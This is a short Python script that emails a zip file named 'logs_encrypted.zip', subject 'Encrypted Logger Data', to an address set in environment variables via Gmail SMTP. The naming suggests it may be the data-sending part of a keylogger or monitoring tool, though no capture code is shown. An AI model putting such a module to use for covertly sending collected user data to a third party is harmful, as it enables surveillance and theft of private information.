import smtplib
from email.message import EmailMessage
import os
from dotenv import load_dotenv

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
TO_EMAIL = os.getenv("TO_EMAIL")

def send_email():
    """Send the encrypted logs via email."""
    msg = EmailMessage()
    msg['Subject'] = "Encrypted Logger Data"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL

    with open("logs_encrypted.zip", "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="zip", filename="logs_encrypted.zip")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
